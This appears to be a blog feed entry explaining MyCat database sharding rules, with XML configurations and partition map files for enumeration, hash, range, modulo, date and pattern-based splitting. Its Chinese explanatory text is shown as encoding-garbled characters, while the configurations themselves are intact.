      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>å¸¸ç”¨çš„æ ¹æ®ä¸»é”®æˆ–éä¸»é”®çš„åˆ†ç‰‡è§„åˆ™é…ç½® </p></blockquote><a id="more"></a><h2 id="1-æšä¸¾æ³•ï¼š"><a href="#1-æšä¸¾æ³•ï¼š" class="headerlink" title="1. æšä¸¾æ³•ï¼š"></a>1. æšä¸¾æ³•ï¼š</h2><p>  é€šè¿‡åœ¨é…ç½®æ–‡ä»¶ä¸­é…ç½®å¯èƒ½çš„æšä¸¾idï¼Œè‡ªå·±é…ç½®åˆ†ç‰‡ï¼Œä½¿ç”¨è§„åˆ™ï¼š</p><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"sharding-by-intfile"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!--åˆ†ç‰‡å‡½æ•°--&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>hash-int<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"hash-int"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByFileMap"</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--æ ‡è¯†é…ç½®æ–‡ä»¶åç§°--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mapFile"</span>&gt;</span>partition-hash-int.txt<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--typeé»˜è®¤å€¼ä¸º0ï¼Œ0è¡¨ç¤ºIntegerï¼Œéé›¶è¡¨ç¤ºString--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"type"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--æ‰€æœ‰çš„èŠ‚ç‚¹é…ç½®éƒ½æ˜¯ä»0å¼€å§‹ï¼ŒåŠ0ä»£è¡¨èŠ‚ç‚¹1--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"defaultNode"</span>&gt;</span>0<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>partition-hash-int.txt é…ç½®ï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">10000=0</div><div class="line">10010=1</div><div class="line">DEFAULT_NODE=1</div></pre></div></div></figure><div class="note danger"><p> defaultNode é»˜è®¤èŠ‚ç‚¹:å°äº0è¡¨ç¤ºä¸è®¾ç½®é»˜è®¤èŠ‚ç‚¹ï¼Œå¤§äºç­‰äº0è¡¨ç¤ºè®¾ç½®é»˜è®¤èŠ‚ç‚¹</p><p>é»˜è®¤èŠ‚ç‚¹çš„ä½œç”¨ï¼šæšä¸¾åˆ†ç‰‡æ—¶ï¼Œå¦‚æœç¢°åˆ°ä¸è¯†åˆ«çš„æšä¸¾å€¼ï¼Œå°±è®©å®ƒè·¯ç”±åˆ°é»˜è®¤èŠ‚ç‚¹<br>å¦‚æœä¸é…ç½®é»˜è®¤èŠ‚ç‚¹ï¼ˆdefaultNodeå€¼å°äº0è¡¨ç¤ºä¸é…ç½®é»˜è®¤èŠ‚ç‚¹ï¼‰ï¼Œç¢°åˆ°<br>ä¸è¯†åˆ«çš„æšä¸¾å€¼å°±ä¼šæŠ¥é”™ï¼Œ</p><p>  <code>like thisï¼šcan&#39;t find datanode for sharding column:column_name val:ffffffff</code></p></div><h2 id="2-å›ºå®šåˆ†ç‰‡hashç®—æ³•"><a href="#2-å›ºå®šåˆ†ç‰‡hashç®—æ³•" class="headerlink" title="2.å›ºå®šåˆ†ç‰‡hashç®—æ³•"></a>2.å›ºå®šåˆ†ç‰‡hashç®—æ³•</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"rule1"</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--åˆ†ç‰‡å‡½æ•°--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>func1<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">  <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"func1"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByLong"</span>&gt;</span></div><div class="line">  <span class="comment">&lt;!--åˆ†ç‰‡ä¸ªæ•°åˆ—è¡¨--&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"partitionCount"</span>&gt;</span>2,1<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">  <span class="comment">&lt;!--åˆ†ç‰‡èŒƒå›´åˆ—è¡¨--&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"partitionLength"</span>&gt;</span>256,512<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">  <span class="comment">&lt;!--åˆ†åŒºé•¿åº¦:é»˜è®¤ä¸ºæœ€å¤§2^n=1024 ,å³æœ€å¤§æ”¯æŒ1024åˆ†åŒº--&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>çº¦æŸ :</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line">count,lengthä¸¤ä¸ªæ•°ç»„çš„é•¿åº¦å¿…é¡»æ˜¯ä¸€è‡´çš„ã€‚</div><div class="line"></div><div class="line">1024 = sum((count[i]*length[i])). countå’Œlengthä¸¤ä¸ªå‘é‡çš„ç‚¹ç§¯æ’ç­‰äº1024</div></pre></div></div></figure><p>ç”¨æ³•ä¾‹å­ï¼š</p><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></div><div class="code"><pre><div class="line">        æœ¬ä¾‹çš„åˆ†åŒºç­–ç•¥ï¼šå¸Œæœ›å°†æ•°æ®æ°´å¹³åˆ†æˆ3ä»½ï¼Œå‰ä¸¤ä»½å„å 25%ï¼Œç¬¬ä¸‰ä»½å 50%ã€‚ï¼ˆæ•…æœ¬ä¾‹éå‡åŒ€åˆ†åŒºï¼‰</div><div class="line">        // |<span class="tag">&lt;<span class="name">---------------------1024------------------------</span>&gt;</span>|</div><div class="line">        // |<span class="tag">&lt;<span class="name">----256---</span>&gt;</span>|<span class="tag">&lt;<span class="name">----256---</span>&gt;</span>|<span class="tag">&lt;<span class="name">----------512----------</span>&gt;</span>|</div><div class="line">        // | partition0 | partition1 | partition2 |</div><div class="line">        // | å…±2ä»½,æ•…count[0]=2 | å…±1ä»½ï¼Œæ•…count[1]=1 |</div><div class="line">        int[] count = new int[] &#123; 2, 1 &#125;;</div><div class="line">        int[] length = new int[] &#123; 256, 512 &#125;;</div><div class="line">        PartitionUtil pu = new PartitionUtil(count, length);</div><div class="line"></div><div class="line">        // ä¸‹é¢ä»£ç æ¼”ç¤ºåˆ†åˆ«ä»¥offerIdå­—æ®µæˆ–memberIdå­—æ®µæ ¹æ®ä¸Šè¿°åˆ†åŒºç­–ç•¥æ‹†åˆ†çš„åˆ†é…ç»“æœ</div><div class="line">        int DEFAULT_STR_HEAD_LEN = 8; // cobaré»˜è®¤ä¼šé…ç½®ä¸ºæ­¤å€¼</div><div class="line">        long offerId = 12345;</div><div class="line">        String memberId = "qiushuo";</div><div class="line"></div><div class="line">        // è‹¥æ ¹æ®offerIdåˆ†é…ï¼ŒpartNo1å°†ç­‰äº0ï¼Œå³æŒ‰ç…§ä¸Šè¿°åˆ†åŒºç­–ç•¥ï¼ŒofferIdä¸º12345æ—¶å°†ä¼šè¢«åˆ†é…åˆ°partition0ä¸­</div><div class="line">        int partNo1 = pu.partition(offerId);</div><div class="line"></div><div class="line">        // è‹¥æ ¹æ®memberIdåˆ†é…ï¼ŒpartNo2å°†ç­‰äº2ï¼Œå³æŒ‰ç…§ä¸Šè¿°åˆ†åŒºç­–ç•¥ï¼ŒmemberIdä¸ºqiushuoæ—¶å°†ä¼šè¢«åˆ†åˆ°partition2ä¸­</div><div class="line">        int partNo2 = pu.partition(memberId, 0, DEFAULT_STR_HEAD_LEN);</div><div class="line"></div><div class="line">å¦‚æœéœ€è¦å¹³å‡åˆ†é…è®¾ç½®ï¼šå¹³å‡åˆ†ä¸º4åˆ†ç‰‡ï¼ŒpartitionCount*partitionLength=1024</div><div class="line"></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"func1"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByLong"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"partitionCount"</span>&gt;</span>4<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"partitionLength"</span>&gt;</span>256<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><h2 id="3-èŒƒå›´çº¦å®š"><a href="#3-èŒƒå›´çº¦å®š" class="headerlink" title="3.èŒƒå›´çº¦å®š"></a>3.èŒƒå›´çº¦å®š</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"auto-sharding-long"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">      <span class="comment">&lt;!--åˆ†ç‰‡å‡½æ•°--&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>rang-long<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"rang-long"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.AutoPartitionByLong"</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--é…ç½®æ–‡ä»¶è·¯å¾„--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mapFile"</span>&gt;</span>autopartition-long.txt<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>autopartition-long.txtï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line"># range start-end ,data node index</div><div class="line"># æ‰€æœ‰çš„èŠ‚ç‚¹é…ç½®éƒ½æ˜¯ä»0å¼€å§‹ï¼ŒåŠ0ä»£è¡¨èŠ‚ç‚¹1ï¼Œæ­¤é…ç½®éå¸¸ç®€å•ï¼Œå³é¢„å…ˆåˆ¶å®šå¯èƒ½çš„idèŒƒå›´åˆ°æŸä¸ªåˆ†ç‰‡</div><div class="line"># K=1000,M=10000.</div><div class="line">0-500M=0</div><div class="line">500M-1000M=1</div><div class="line">1000M-1500M=2</div><div class="line">æˆ–</div><div class="line">0-10000000=0</div><div class="line">10000001-20000000=1</div></pre></div></div></figure><h2 id="4-æ±‚æ¨¡æ³•"><a href="#4-æ±‚æ¨¡æ³•" class="headerlink" title="4.æ±‚æ¨¡æ³•"></a>4.æ±‚æ¨¡æ³•</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"mod-long"</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">     <span class="comment">&lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt;</span></div><div class="line">     <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">     <span class="comment">&lt;!--åˆ†ç‰‡å‡½æ•°--&gt;</span></div><div class="line">     <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>mod-long<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">   <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"mod-long"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByMod"</span>&gt;</span></div><div class="line">   <span class="comment">&lt;!--æ³¨æ„ï¼è¿™é‡Œå¡«å†™æ•°æ®åº“èŠ‚ç‚¹æ•°ï¼Œå¦åˆ™æ— æ³•åˆ†ç‰‡--&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"count"</span>&gt;</span>3<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>æ­¤ç§é…ç½®éå¸¸æ˜ç¡®å³æ ¹æ®idè¿›è¡Œåè¿›åˆ¶æ±‚æ¨¡é¢„ç®—ï¼Œç›¸æ¯”æ–¹å¼1ï¼Œæ­¤ç§åœ¨æ‰¹é‡æ’å…¥æ—¶éœ€è¦åˆ‡æ¢æ•°æ®æºï¼Œidä¸è¿ç»­</p><h2 id="5-æ—¥æœŸåˆ—åˆ†åŒºæ³•"><a href="#5-æ—¥æœŸåˆ—åˆ†åŒºæ³•" class="headerlink" title="5.æ—¥æœŸåˆ—åˆ†åŒºæ³•"></a>5.æ—¥æœŸåˆ—åˆ†åŒºæ³•</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"sharding-by-date"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">columns</span>&gt;</span>create_time<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--åˆ†ç‰‡å‡½æ•°--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>sharding-by-date<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span>  </div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"sharding-by-date"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByDate"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dateFormat"</span>&gt;</span>yyyy-MM-dd<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"sBeginDate"</span>&gt;</span>2015-01-01<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"sPartionDay"</span>&gt;</span>10<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>é…ç½®ä¸­é…ç½®äº†å¼€å§‹æ—¥æœŸï¼Œåˆ†åŒºå¤©æ•°ï¼Œå³é»˜è®¤ä»å¼€å§‹æ—¥æœŸç®—èµ·ï¼Œåˆ†éš”10å¤©ä¸€ä¸ªåˆ†åŒº</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></div><div class="code"><pre><div class="line">Assert.assertEquals(true, 0 == partition.calculate(&quot;2015-01-01&quot;));</div><div class="line">Assert.assertEquals(true, 0 == partition.calculate(&quot;2015-01-10&quot;));</div><div class="line">Assert.assertEquals(true, 1 == partition.calculate(&quot;2015-01-11&quot;));</div><div class="line">Assert.assertEquals(true, 12 == partition.calculate(&quot;2015-05-01&quot;));</div></pre></div></div></figure><h2 id="6-é€šé…å–æ¨¡"><a href="#6-é€šé…å–æ¨¡" class="headerlink" title="6.é€šé…å–æ¨¡"></a>6.é€šé…å–æ¨¡</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"sharding-by-pattern"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--åˆ†ç‰‡å‡½æ•°--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>sharding-by-pattern<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"sharding-by-pattern"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByPattern"</span>&gt;</span></div><div class="line"><span class="comment">&lt;!--æ±‚æ¨¡åŸºæ•°--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"patternValue"</span>&gt;</span>256<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--é»˜è®¤èŠ‚ç‚¹--&gt;</span></div><div class="line">    <span class="comment">&lt;!--å¦‚æœé…ç½®äº†é»˜è®¤ï¼Œåˆ™ä¸ä¼šæŒ‰ç…§æ±‚æ¨¡è¿ç®—--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"defaultNode"</span>&gt;</span>2<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!-- é…ç½®æ–‡ä»¶è·¯å¾„--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mapFile"</span>&gt;</span>partition-pattern.txt<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>partition-pattern.txt ï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></div><div class="code"><pre><div class="line"># id partition range start-end ,data node index</div><div class="line">###### first host configuration</div><div class="line">1-32=0</div><div class="line">33-64=1</div><div class="line">65-96=2</div><div class="line">97-128=3</div><div class="line">######## second host configuration</div><div class="line">129-160=4</div><div class="line">161-192=5</div><div class="line">193-224=6</div><div class="line">225-256=7</div><div class="line">0-0=7</div><div class="line"></div><div class="line">#1-32 å³ä»£è¡¨id%256ååˆ†å¸ƒçš„èŒƒå›´ï¼Œå¦‚æœåœ¨1-32åˆ™åœ¨åˆ†åŒº1ï¼Œå…¶ä»–ç±»æ¨ï¼Œå¦‚æœidéæ•°æ®ï¼Œåˆ™ä¼šåˆ†é…åœ¨defaoultNode é»˜è®¤èŠ‚ç‚¹</div></pre></div></div></figure><h2 id="7-ASCIIç æ±‚æ¨¡é€šé…"><a href="#7-ASCIIç æ±‚æ¨¡é€šé…" class="headerlink" title="7. ASCIIç æ±‚æ¨¡é€šé…"></a>7. ASCIIç æ±‚æ¨¡é€šé…</h2><figure class="highlight xml"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></div><div class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">tableRule</span> <span class="attr">name</span>=<span class="string">"sharding-by-prefixpattern"</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">rule</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--æ ‡è¯†å°†è¦åˆ†ç‰‡çš„è¡¨å­—æ®µ--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">columns</span>&gt;</span>user_id<span class="tag">&lt;/<span class="name">columns</span>&gt;</span></div><div class="line">        <span class="comment">&lt;!--åˆ†ç‰‡å‡½æ•°--&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">algorithm</span>&gt;</span>sharding-by-prefixpattern<span class="tag">&lt;/<span class="name">algorithm</span>&gt;</span></div><div class="line">      <span class="tag">&lt;/<span class="name">rule</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">tableRule</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">function</span> <span class="attr">name</span>=<span class="string">"sharding-by-pattern"</span> <span class="attr">class</span>=<span class="string">"org.opencloudb.route.function.PartitionByPattern"</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--æ±‚æ¨¡åŸºæ•°--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"patternValue"</span>&gt;</span>256<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--ASCII æˆªå–çš„ä½æ•°--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefixLength"</span>&gt;</span>5<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!-- é…ç½®æ–‡ä»¶è·¯å¾„--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mapFile"</span>&gt;</span>partition-pattern.txt<span class="tag">&lt;/<span class="name">property</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">function</span>&gt;</span></div></pre></div></div></figure><p>partition-pattern.txtï¼š</p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></div><div class="code"><pre><div class="line"># range start-end ,data node index</div><div class="line"># ASCII</div><div class="line"># 48-57=0-9</div><div class="line"># 64ã€65-90=@ã€A-Z</div><div class="line"># 97-122=a-z</div><div class="line">###### first host configuration</div><div class="line">1-4=0</div><div class="line">5-8=1</div><div class="line">9-12=2</div><div class="line">13-16=3</div><div class="line">###### second host configuration</div><div class="line">17-20=4</div><div class="line">21-24=5</div><div class="line">25-28=6</div><div class="line">29-32=7</div><div class="line">0-0=7</div><div class="line">#1-32 å³ä»£è¡¨id%256ååˆ†å¸ƒçš„èŒƒå›´ï¼Œå¦‚æœåœ¨1-32åˆ™åœ¨åˆ†åŒº1ï¼Œå…¶ä»–ç±»æ¨</div></pre></div></div></figure><p>æ­¤ç§æ–¹å¼ç±»ä¼¼<code>æ–¹å¼6</code>åªä¸è¿‡é‡‡å–çš„æ˜¯å°†åˆ—ç§è·å–å‰prefixLengthä½åˆ—æ‰€æœ‰ASCIIç çš„å’Œè¿›è¡Œæ±‚æ¨¡sum%patternValue ,è·å–çš„å€¼ï¼Œåœ¨é€šé…èŒƒå›´å†…çš„å³ åˆ†ç‰‡æ•°ï¼Œ</p><blockquote><p>ASCIIç¼–ç ï¼š<br>48-57=0-9é˜¿æ‹‰ä¼¯æ•°å­—<br>64ã€65-90=@ã€A-Z<br>97-122=a-z</p></blockquote><p>ä¾‹å¦‚ï¼š </p><figure class="highlight plain"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></div><div class="code"><pre><div class="line">String idVal=&quot;gf89f9a&quot;;</div><div class="line">Assert.assertEquals(true, 0==autoPartition.calculate(idVal));</div><div class="line"></div><div class="line">idVal=&quot;8df99a&quot;;</div><div class="line">Assert.assertEquals(true, 4==autoPartition.calculate(idVal));</div><div class="line"></div><div class="line">idVal=&quot;8dhdf99a&quot;;</div><div class="line">Assert.assertEquals(true, 3==autoPartition.calculate(idVal));</div></pre></div></div></figure><h2 id="8-ç¼–ç¨‹æŒ‡å®š"><a href="#8-ç¼–ç¨‹æŒ‡å®š" class="headerlink" title="8.ç¼–ç¨‹æŒ‡å®š"></a>8.ç¼–ç¨‹æŒ‡å®š</h2><figure 